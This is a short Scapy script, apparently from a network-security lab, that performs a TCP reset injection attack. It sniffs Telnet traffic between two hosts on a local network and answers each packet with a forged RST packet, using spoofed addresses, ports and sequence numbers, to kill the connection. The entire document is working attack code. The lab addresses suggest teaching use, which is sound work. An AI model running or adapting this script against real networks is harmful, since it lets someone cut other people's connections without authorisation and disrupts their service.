from scapy.all import IP, TCP, send, sniff

H1_IP = '10.9.0.6'
V_IP = '10.9.0.5'

# Require correct src_ip, dst_ip, sport, dport and SEQ to launch RST attack
# it is simplified here by sniff these fields in packet on LAN
def spoofRST(pkt):
  ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
  tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='R', seq=pkt[TCP].ack)
  npkt = ip/tcp
  send(npkt, verbose=0)

f0 = 'tcp and src host ' + V_IP + ' and src port 23 and dst host ' + H1_IP
sniff(iface='br-75f8e3d470c7', filter=f0, prn=spoofRST)